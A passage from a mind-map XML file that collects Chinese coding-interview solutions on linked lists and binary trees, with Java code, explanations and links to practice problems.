      </p>
      <pre>public ListNode deleteNode(ListNode head, ListNode tobeDelete) {
    if (head == null || tobeDelete == null)
        return null;
    if (tobeDelete.next != null) {
        // 要删除的节点不是尾节点
        ListNode next = tobeDelete.next;
        tobeDelete.val = next.val;
        tobeDelete.next = next.next;
    } else {
        if (head == tobeDelete)
             // 只有一个节点
            head = null;
        else {
            ListNode cur = head;
            while (cur.next != tobeDelete)
                cur = cur.next;
            cur.next = null;
        }
    }
    return head;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_874348307" CREATED="1754750414079" MODIFIED="1754751207922" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/18.2%20%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8%E4%B8%AD%E9%87%8D%E5%A4%8D%E7%9A%84%E7%BB%93%E7%82%B9.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    18.2 删除链表中重复的结点
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <p>
        <a href="https://www.nowcoder.com/practice/fc533c45b73a41b0b44ccba763f866ef?tpId=13&amp;tqId=11209&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/17e301df-52e8-4886-b593-841a16d13e44.png" width="450"/>
        
      </div>
      <br/>
      

      <h2>
        解题描述
      </h2>
      <pre>public ListNode deleteDuplication(ListNode pHead) {
    if (pHead == null || pHead.next == null)
        return pHead;
    ListNode next = pHead.next;
    if (pHead.val == next.val) {
        while (next != null &amp;&amp; pHead.val == next.val)
            next = next.next;
        return deleteDuplication(next);
    } else {
        pHead.next = deleteDuplication(pHead.next);
        return pHead;
    }
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_206387465" CREATED="1754750414082" MODIFIED="1754751207658" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/22.%20%E9%93%BE%E8%A1%A8%E4%B8%AD%E5%80%92%E6%95%B0%E7%AC%AC%20K%20%E4%B8%AA%E7%BB%93%E7%82%B9.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    22. 链表中倒数第 K 个结点
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <p>
        <a href="https://www.nowcoder.com/practice/886370fe658f41b498d40fb34ae76ff9?tpId=13&amp;tqId=11167&amp;tab=answerKey&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        解题思路
      </h2>
      <p>
        设链表的长度为 N。设置两个指针 P1 和 P2，先让 P1 移动 K 个节点，则还有 N - K 个节点可以移动。此时让 P1 和 P2 同时移动，可以知道当 P1 移动到链表结尾时，P2 移动到第 N - K 个节点处，该位置就是倒数第 K 个节点。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/6b504f1f-bf76-4aab-a146-a9c7a58c2029.png" width="500"/>
        
      </div>
      <br/>
      

      <pre>public ListNode FindKthToTail(ListNode head, int k) {
    if (head == null)
        return null;
    ListNode P1 = head;
    while (P1 != null &amp;&amp; k-- &gt; 0)
        P1 = P1.next;
    if (k &gt; 0)
        return null;
    ListNode P2 = head;
    while (P1 != null) {
        P1 = P1.next;
        P2 = P2.next;
    }
    return P2;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1839519019" CREATED="1754750414086" MODIFIED="1754751207979" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/23.%20%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%8E%AF%E7%9A%84%E5%85%A5%E5%8F%A3%E7%BB%93%E7%82%B9.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    23. 链表中环的入口结点
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <p>
        <a href="https://www.nowcoder.com/practice/253d2c59ec3e4bc68da16833f79a38e4?tpId=13&amp;tqId=11208&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">NowCoder</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        一个链表中包含环，请找出该链表的环的入口结点。要求不能使用额外的空间。
      </p>
      <h2>
        解题思路
      </h2>
      <p>
        使用双指针，一个快指针 fast 每次移动两个节点，一个慢指针 slow 每次移动一个节点。因为存在环，所以两个指针必定相遇在环中的某个节点上。
      </p>
      <p>
        假设环入口节点为 y1，相遇所在节点为 z1。
      </p>
      <p>
        假设快指针 fast 在圈内绕了 N 圈，则总路径长度为 x+Ny+(N-1)z。z 为 (N-1) 倍是因为快慢指针最后已经在 z1 节点相遇了，后面就不需要再走了。
      </p>
      <p>
        而慢指针 slow 总路径长度为 x+y。
      </p>
      <p>
        因为快指针是慢指针的两倍，因此 x+Ny+(N-1)z = 2(x+y)。
      </p>
      <p>
        我们要找的是环入口节点 y1，也可以看成寻找长度 x 的值，因此我们先将上面的等值分解为和 x 有关：x=(N-2)y+(N-1)z。
      </p>
      <p>
        上面的等值没有很强的规律，但是我们可以发现 y+z 就是圆环的总长度，因此我们将上面的等式再分解：x=(N-2)(y+z)+z。这个等式左边是从起点x1 到环入口节点 y1 的长度，而右边是在圆环中走过 (N-2) 圈，再从相遇点 z1 再走过长度为 z 的长度。此时我们可以发现如果让两个指针同时从起点 x1 和相遇点 z1 开始，每次只走过一个距离，那么最后他们会在环入口节点相遇。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/bb7fc182-98c2-4860-8ea3-630e27a5f29f.png" width="500"/>
        
      </div>
      <br/>
      

      <pre>public ListNode EntryNodeOfLoop(ListNode pHead) {
    if (pHead == null || pHead.next == null)
        return null;
    ListNode slow = pHead, fast = pHead;
    do {
        fast = fast.next.next;
        slow = slow.next;
    } while (slow != fast);
    fast = pHead;
    while (slow != fast) {
        slow = slow.next;
        fast = fast.next;
    }
    return slow;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1482798887" CREATED="1754750414089" MODIFIED="1754751208628" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/24.%20%E5%8F%8D%E8%BD%AC%E9%93%BE%E8%A1%A8.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    24. 反转链表
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <p>
        <a href="https://www.nowcoder.com/practice/75e878df47f24fdc9dc3e400ec6058ca?tpId=13&amp;tqId=11168&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">NowCoder</a>
      </p>
      <h2>
        解题思路
      </h2>
      <h3>
        递归
      </h3>
      <pre>public ListNode ReverseList(ListNode head) {
    if (head == null || head.next == null)
        return head;
    ListNode next = head.next;
    head.next = null;
    ListNode newHead = ReverseList(next);
    next.next = head;
    return newHead;
}</pre>
      <h3>
        迭代
      </h3>
      <p>
        使用头插法。
      </p>
      <pre>public ListNode ReverseList(ListNode head) {
    ListNode newList = new ListNode(-1);
    while (head != null) {
        ListNode next = head.next;
        head.next = newList.next;
        newList.next = head;
        head = next;
    }
    return newList.next;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_232779691" CREATED="1754750414093" MODIFIED="1754751208905" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/25.%20%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%8E%92%E5%BA%8F%E7%9A%84%E9%93%BE%E8%A1%A8.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    25. 合并两个排序的链表
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <p>
        <a href="https://www.nowcoder.com/practice/d8b6b4358f774294a89de2a6ac4d9337?tpId=13&amp;tqId=11169&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">NowCoder</a>
      </p>
      <h2>
        题目描述
      </h2>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/c094d2bc-ec75-444b-af77-d369dfb6b3b4.png" width="400"/>
        
      </div>
      <br/>
      

      <h2>
        解题思路
      </h2>
      <h3>
        递归
      </h3>
      <pre>public ListNode Merge(ListNode list1, ListNode list2) {
    if (list1 == null)
        return list2;
    if (list2 == null)
        return list1;
    if (list1.val &lt;= list2.val) {
        list1.next = Merge(list1.next, list2);
        return list1;
    } else {
        list2.next = Merge(list1, list2.next);
        return list2;
    }
}</pre>
      <h3>
        迭代
      </h3>
      <pre>public ListNode Merge(ListNode list1, ListNode list2) {
    ListNode head = new ListNode(-1);
    ListNode cur = head;
    while (list1 != null &amp;&amp; list2 != null) {
        if (list1.val &lt;= list2.val) {
            cur.next = list1;
            list1 = list1.next;
        } else {
            cur.next = list2;
            list2 = list2.next;
        }
        cur = cur.next;
    }
    if (list1 != null)
        cur.next = list1;
    if (list2 != null)
        cur.next = list2;
    return head.next;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1464970291" CREATED="1754750414097" MODIFIED="1754751207993" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/35.%20%E5%A4%8D%E6%9D%82%E9%93%BE%E8%A1%A8%E7%9A%84%E5%A4%8D%E5%88%B6.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    35. 复杂链表的复制
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <p>
        <a href="https://www.nowcoder.com/practice/f836b2c43afc4b35ad6adc41ec941dba?tpId=13&amp;tqId=11178&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">NowCoder</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        输入一个复杂链表（每个节点中有节点值，以及两个指针，一个指向下一个节点，另一个特殊指针指向任意一个节点），返回结果为复制后复杂链表的 head。
      </p>
      <pre>public class RandomListNode {
    int label;
    RandomListNode next = null;
    RandomListNode random = null;
    RandomListNode(int label) {
        this.label = label;
    }
}</pre>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/66a01953-5303-43b1-8646-0c77b825e980.png" width="300"/>
        
      </div>
      <br/>
      

      <h2>
        解题思路
      </h2>
      <p>
        第一步，在每个节点的后面插入复制的节点。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/dfd5d3f8-673c-486b-8ecf-d2082107b67b.png" width="600"/>
        
      </div>
      <br/>
      

      <p>
        第二步，对复制节点的 random 链接进行赋值。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/cafbfeb8-7dfe-4c0a-a3c9-750eeb824068.png" width="600"/>
        
      </div>
      <br/>
      

      <p>
        第三步，拆分。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/e151b5df-5390-4365-b66e-b130cd253c12.png" width="600"/>
        
      </div>
      <br/>
      

      <pre>public RandomListNode Clone(RandomListNode pHead) {
    if (pHead == null)
        return null;
    // 插入新节点
    RandomListNode cur = pHead;
    while (cur != null) {
        RandomListNode clone = new RandomListNode(cur.label);
        clone.next = cur.next;
        cur.next = clone;
        cur = clone.next;
    }
    // 建立 random 链接
    cur = pHead;
    while (cur != null) {
        RandomListNode clone = cur.next;
        if (cur.random != null)
            clone.random = cur.random.next;
        cur = clone.next;
    }
    // 拆分
    cur = pHead;
    RandomListNode pCloneHead = pHead.next;
    while (cur.next != null) {
        RandomListNode next = cur.next;
        cur.next = next.next;
        cur = next;
    }
    return pCloneHead;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1668281279" CREATED="1754750414100" MODIFIED="1754751209636" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/52.%20%E4%B8%A4%E4%B8%AA%E9%93%BE%E8%A1%A8%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%85%AC%E5%85%B1%E7%BB%93%E7%82%B9.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    52. 两个链表的第一个公共结点
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <p>
        <a href="https://www.nowcoder.com/practice/6ab1d9a29e88450685099d45c9e31e46?tpId=13&amp;tqId=11189&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">NowCoder</a>
      </p>
      <h2>
        题目描述
      </h2>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/5f1cb999-cb9a-4f6c-a0af-d90377295ab8.png" width="500"/>
        
      </div>
      <br/>
      

      <h2>
        解题思路
      </h2>
      <p>
        设 A 的长度为 a + c，B 的长度为 b + c，其中 c 为尾部公共部分长度，可知 a + c + b = b + c + a。
      </p>
      <p>
        当访问链表 A 的指针访问到链表尾部时，令它从链表 B 的头部重新开始访问链表 B；同样地，当访问链表 B 的指针访问到链表尾部时，令它从链表 A 的头部重新开始访问链表 A。这样就能控制访问 A 和 B 两个链表的指针能同时访问到交点。
      </p>
      <pre>public ListNode FindFirstCommonNode(ListNode pHead1, ListNode pHead2) {
    ListNode l1 = pHead1, l2 = pHead2;
    while (l1 != l2) {
        l1 = (l1 == null) ? pHead2 : l1.next;
        l2 = (l2 == null) ? pHead1 : l2.next;
    }
    return l1;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_451404767" CREATED="1754750400545" MODIFIED="1754750414159" MAX_WIDTH="800 px"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      树
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_784069866" CREATED="1754750414103" MODIFIED="1754751217282" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/7.%20%E9%87%8D%E5%BB%BA%E4%BA%8C%E5%8F%89%E6%A0%91.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    7. 重建二叉树
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/8a19cbe657394eeaac2f6ea9b0f6fcf6?tpId=13&amp;tqId=11157&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        根据二叉树的前序遍历和中序遍历的结果，重建出该二叉树。假设输入的前序遍历和中序遍历的结果中都不含重复的数字。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191102210342488.png" width="400"/>
        
      </div>
      <br/>
      

      <h2>
        解题思路
      </h2>
      <p>
        前序遍历的第一个值为根节点的值，使用这个值将中序遍历结果分成两部分，左部分为树的左子树中序遍历结果，右部分为树的右子树中序遍历的结果。然后分别对左右子树递归地求解。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/60c4a44c-7829-4242-b3a1-26c3b513aaf0.gif" width="430px"/>
        
      </div>
      <br/>
      

      <pre>// 缓存中序遍历数组每个值对应的索引
private Map&lt;Integer, Integer&gt; indexForInOrders = new HashMap&lt;&gt;();
public TreeNode reConstructBinaryTree(int[] pre, int[] in) {
    for (int i = 0; i &lt; in.length; i++)
        indexForInOrders.put(in[i], i);
    return reConstructBinaryTree(pre, 0, pre.length - 1, 0);
}
private TreeNode reConstructBinaryTree(int[] pre, int preL, int preR, int inL) {
    if (preL &gt; preR)
        return null;
    TreeNode root = new TreeNode(pre[preL]);
    int inIndex = indexForInOrders.get(root.val);
    int leftTreeSize = inIndex - inL;
    root.left = reConstructBinaryTree(pre, preL + 1, preL + leftTreeSize, inL);
    root.right = reConstructBinaryTree(pre, preL + leftTreeSize + 1, preR, inL + leftTreeSize + 1);
    return root;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1460381800" CREATED="1754750414106" MODIFIED="1754751214521" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/8.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E4%B8%8B%E4%B8%80%E4%B8%AA%E7%BB%93%E7%82%B9.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    8. 二叉树的下一个结点
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/9023a0c988684a53960365b889ceaf5e?tpId=13&amp;tqId=11210&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        给定一个二叉树和其中的一个结点，请找出中序遍历顺序的下一个结点并且返回 。注意，树中的结点不仅包含左右子结点，同时包含指向父结点的指针。
      </p>
      <pre>public class TreeLinkNode {
    int val;
    TreeLinkNode left = null;
    TreeLinkNode right = null;
    TreeLinkNode next = null; // 指向父结点的指针
    TreeLinkNode(int val) {
        this.val = val;
    }
}</pre>
      <h2>
        解题思路
      </h2>
      <p>
        我们先来回顾一下中序遍历的过程：先遍历树的左子树，再遍历根节点，最后再遍历右子树。所以最左节点是中序遍历的第一个节点。
      </p>
      <pre>void traverse(TreeNode root) {
    if (root == null) return;
    traverse(root.left);
    visit(root);
    traverse(root.right);
}</pre>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ad5cc8fc-d59b-45ce-8899-63a18320d97e.gif" width="300px"/>
        
      </div>
      <br/>
      

      <p>
        ① 如果一个节点的右子树不为空，那么该节点的下一个节点是右子树的最左节点；
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7008dc2b-6f13-4174-a516-28b2d75b0152.gif" width="300px"/>
        
      </div>
      <br/>
      

      <p>
        ② 否则，向上找第一个左链接指向的树包含该节点的祖先节点。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/094e3ac8-e080-4e94-9f0a-64c25abc695e.gif" width="300px"/>
        
      </div>
      <br/>
      

      <pre>public TreeLinkNode GetNext(TreeLinkNode pNode) {
    if (pNode.right != null) {
        TreeLinkNode node = pNode.right;
        while (node.left != null)
            node = node.left;
        return node;
    } else {
        while (pNode.next != null) {
            TreeLinkNode parent = pNode.next;
            if (parent.left == pNode)
                return parent;
            pNode = pNode.next;
        }
    }
    return null;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1253472247" CREATED="1754750414110" MODIFIED="1754751214767" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/26.%20%E6%A0%91%E7%9A%84%E5%AD%90%E7%BB%93%E6%9E%84.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    26. 树的子结构
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/6e196c44c7004d15b1610b9afca8bd88?tpId=13&amp;tqId=11170&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/84a5b15a-86c5-4d8e-9439-d9fd5a4699a1.jpg" width="450"/>
        
      </div>
      <br/>
      

      <h2>
        解题思路
      </h2>
      <pre>public boolean HasSubtree(TreeNode root1, TreeNode root2) {
    if (root1 == null || root2 == null)
        return false;
    return isSubtreeWithRoot(root1, root2) || HasSubtree(root1.left, root2) || HasSubtree(root1.right, root2);
}
private boolean isSubtreeWithRoot(TreeNode root1, TreeNode root2) {
    if (root2 == null)
        return true;
    if (root1 == null)
        return false;
    if (root1.val != root2.val)
        return false;
    return isSubtreeWithRoot(root1.left, root2.left) &amp;&amp; isSubtreeWithRoot(root1.right, root2.right);
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1651725090" CREATED="1754750414115" MODIFIED="1754751213580" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/27.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E9%95%9C%E5%83%8F.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    27. 二叉树的镜像
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <p>
        <a href="https://www.nowcoder.com/practice/a9d0ecbacef9410ca97463e4a5c83be7?tpId=13&amp;tqId=11171&amp;tab=answerKey&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/0c12221f-729e-4c22-b0ba-0dfc909f8adf.jpg" width="300"/>
        
      </div>
      <br/>
      

      <h2>
        解题思路
      </h2>
      <pre>public TreeNode Mirror(TreeNode root) {
    if (root == null)
        return root;
    swap(root);
    Mirror(root.left);
    Mirror(root.right);
    return root;
}
private void swap(TreeNode root) {
    TreeNode t = root.left;
    root.left = root.right;
    root.right = t;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_775596602" CREATED="1754750414118" MODIFIED="1754751213978" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/28.%20%E5%AF%B9%E7%A7%B0%E7%9A%84%E4%BA%8C%E5%8F%89%E6%A0%91.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    28. 对称的二叉树
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <p>
        <a href="https://www.nowcoder.com/practice/ff05d44dfdb04e1d83bdbdab320efbcb?tpId=13&amp;tqId=11211&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">NowCoder</a>
      </p>
      <h2>
        题目描述
      </h2>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/0c12221f-729e-4c22-b0ba-0dfc909f8adf.jpg" width="300"/>
        
      </div>
      <br/>
      

      <h2>
        解题思路
      </h2>
      <pre>boolean isSymmetrical(TreeNode pRoot) {
    if (pRoot == null)
        return true;
    return isSymmetrical(pRoot.left, pRoot.right);
}
boolean isSymmetrical(TreeNode t1, TreeNode t2) {
    if (t1 == null &amp;&amp; t2 == null)
        return true;
    if (t1 == null || t2 == null)
        return false;
    if (t1.val != t2.val)
        return false;
    return isSymmetrical(t1.left, t2.right) &amp;&amp; isSymmetrical(t1.right, t2.left);
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_774828939" CREATED="1754750414121" MODIFIED="1754751214522" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/32.1%20%E4%BB%8E%E4%B8%8A%E5%BE%80%E4%B8%8B%E6%89%93%E5%8D%B0%E4%BA%8C%E5%8F%89%E6%A0%91.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    32.1 从上往下打印二叉树
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <p>
        <a href="https://www.nowcoder.com/practice/7fe2212963db4790b57431d9ed259701?tpId=13&amp;tqId=11175&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">NowCoder</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        从上往下打印出二叉树的每个节点，同层节点从左至右打印。
      </p>
      <p>
        例如，以下二叉树层次遍历的结果为：1,2,3,4,5,6,7
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/d5e838cf-d8a2-49af-90df-1b2a714ee676.jpg" width="250"/>
        
      </div>
      <br/>
      

      <h2>
        解题思路
      </h2>
      <p>
        使用队列来进行层次遍历。
      </p>
      <p>
        不需要使用两个队列分别存储当前层的节点和下一层的节点，因为在开始遍历一层的节点时，当前队列中的节点数就是当前层的节点数，只要控制遍历这么多节点数，就能保证这次遍历的都是当前层的节点。
      </p>
      <pre>public ArrayList&lt;Integer&gt; PrintFromTopToBottom(TreeNode root) {
    Queue&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;();
    ArrayList&lt;Integer&gt; ret = new ArrayList&lt;&gt;();
    queue.add(root);
    while (!queue.isEmpty()) {
        int cnt = queue.size();
        while (cnt-- &gt; 0) {
            TreeNode t = queue.poll();
            if (t == null)
                continue;
            ret.add(t.val);
            queue.add(t.left);
            queue.add(t.right);
        }
    }
    return ret;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1303018670" CREATED="1754750414124" MODIFIED="1754751213566" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/32.2%20%E6%8A%8A%E4%BA%8C%E5%8F%89%E6%A0%91%E6%89%93%E5%8D%B0%E6%88%90%E5%A4%9A%E8%A1%8C.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    32.2 把二叉树打印成多行
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <p>
        <a href="https://www.nowcoder.com/practice/445c44d982d04483b04a54f298796288?tpId=13&amp;tqId=11213&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">NowCoder</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        和上题几乎一样。
      </p>
      <h2>
        解题思路
      </h2>
      <pre>ArrayList&lt;ArrayList&lt;Integer&gt;&gt; Print(TreeNode pRoot) {
    ArrayList&lt;ArrayList&lt;Integer&gt;&gt; ret = new ArrayList&lt;&gt;();
    Queue&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;();
    queue.add(pRoot);
    while (!queue.isEmpty()) {
        ArrayList&lt;Integer&gt; list = new ArrayList&lt;&gt;();
        int cnt = queue.size();
        while (cnt-- &gt; 0) {
            TreeNode node = queue.poll();
            if (node == null)
                continue;
            list.add(node.val);
            queue.add(node.left);
            queue.add(node.right);
        }
        if (list.size() != 0)
            ret.add(list);
    }
    return ret;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1718605433" CREATED="1754750414128" MODIFIED="1754751213580" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/32.3%20%E6%8C%89%E4%B9%8B%E5%AD%97%E5%BD%A2%E9%A1%BA%E5%BA%8F%E6%89%93%E5%8D%B0%E4%BA%8C%E5%8F%89%E6%A0%91.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    32.3 按之字形顺序打印二叉树
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <p>
        <a href="https://www.nowcoder.com/practice/91b69814117f4e8097390d107d2efbe0?tpId=13&amp;tqId=11212&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">NowCoder</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        请实现一个函数按照之字形打印二叉树，即第一行按照从左到右的顺序打印，第二层按照从右至左的顺序打印，第三行按照从左到右的顺序打印，其他行以此类推。
      </p>
      <h2>
        解题思路
      </h2>
      <pre>public ArrayList&lt;ArrayList&lt;Integer&gt;&gt; Print(TreeNode pRoot) {
    ArrayList&lt;ArrayList&lt;Integer&gt;&gt; ret = new ArrayList&lt;&gt;();
    Queue&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;();
    queue.add(pRoot);
    boolean reverse = false;
    while (!queue.isEmpty()) {
        ArrayList&lt;Integer&gt; list = new ArrayList&lt;&gt;();
        int cnt = queue.size();
        while (cnt-- &gt; 0) {
            TreeNode node = queue.poll();
            if (node == null)
                continue;
            list.add(node.val);
            queue.add(node.left);
            queue.add(node.right);
        }
        if (reverse)
            Collections.reverse(list);
        reverse = !reverse;
        if (list.size() != 0)
            ret.add(list);
    }
    return ret;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1482918962" CREATED="1754750414132" MODIFIED="1754751214053" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/33.%20%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E7%9A%84%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86%E5%BA%8F%E5%88%97.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    33. 二叉搜索树的后序遍历序列
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
